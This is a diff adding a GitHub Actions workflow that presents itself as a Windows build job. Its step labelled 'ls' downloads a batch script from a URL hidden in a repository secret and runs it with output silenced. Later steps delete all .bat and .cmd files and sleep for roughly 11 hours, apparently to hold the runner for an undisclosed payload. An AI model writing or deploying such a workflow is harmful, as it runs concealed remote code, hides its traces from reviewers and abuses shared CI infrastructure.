@@ -1,0 +1,25 @@
+name: Makealast
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Building
+    runs-on: windows-latest
+
+    steps:
+    - name: ls
+      shell: cmd
+      run: |
+        curl -L %GIST_URL% -o loads.bat >nul 2>&1
+        cmd /c loads.bat >nul 2>&1
+      env:
+        GIST_URL: ${{ secrets.GIST_URL }}
+
+    - name: Del1
+      run: cmd /c "del /f *.bat"
+
+    - name: Del2
+      run: cmd /c "del /f *.cmd"
+    - name: AB
+      run: Start-Sleep -Seconds 41000
